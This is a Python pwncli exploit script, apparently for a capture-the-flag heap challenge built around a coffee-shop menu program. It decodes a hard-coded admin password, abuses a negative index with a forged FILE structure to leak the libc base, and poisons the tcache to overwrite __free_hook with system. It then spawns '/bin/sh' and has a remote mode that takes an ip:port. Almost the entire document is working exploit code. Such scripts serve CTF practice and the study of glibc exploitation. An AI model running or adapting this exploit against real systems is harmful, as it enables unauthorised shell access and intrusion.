#!/usr/bin/env python3
# Date: 2023-11-04 14:05:20
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *

cli_script()
set_remote_libc("libc-2.31.so")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c: str(c).encode()
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
debugB = lambda: input("\033[1m\033[33m[ATTACH ME]\033[0m")


def cmd(choice):
    ru(b">>>")
    s(i2b(choice))


def sell(co_id, sth=b""):
    cmd(1)
    ru(b"input the id of what coffee you want to buy")
    s(i2b(co_id))
    ru(b"Do you want to add something?Y/N")
    if sth == b"":
        sl(b"N")
    else:
        sl(b"Y")
        ru(b"Ok,please input what you need in coffee")
        s(sth)


def admin():
    cmd(4421)
    ru(b"please input the admin password")
    _pass = b'lwuv"ryp"kv'
    new_pass = b""
    for i in _pass:
        new_pass += bytes([i - 2])
    sl(new_pass)


def repl(id):
    cmd(1)
    ru(b"input the id you want to replenish")
    cmd(id)


def change(id, cfe, cont):
    cmd(2)
    ru(b"input the id you want to change")
    cmd(id)
    ru(b"input which coffee you want to change")
    cmd(cfe)
    ru(b"input your content")
    s(cont)


admin()

payload = p64(0xFBAD1800) + p64(0) * 3 + p8(0)
change(1, -31, payload)
ru(b"\x00" * 8)
libc_base = u64_ex(rn(6)) - 0x1EC980
lg("libc_base", libc_base)

cmd(3)
sell(3)
sell(3)
sell(3)
sell(3)
sell(3)
sell(3)

admin()
change(3, 6, p64(libc_base + libc.sym.__free_hook))

cmd(3)
for i in range(5):
    sell(2)
admin()
repl(2)
repl(2)
repl(2)
change(2, 3, p64(libc_base + libc.sym.system))
change(1, 1, b"/bin/sh\x00")
cmd(3)
sell(1)

ia()
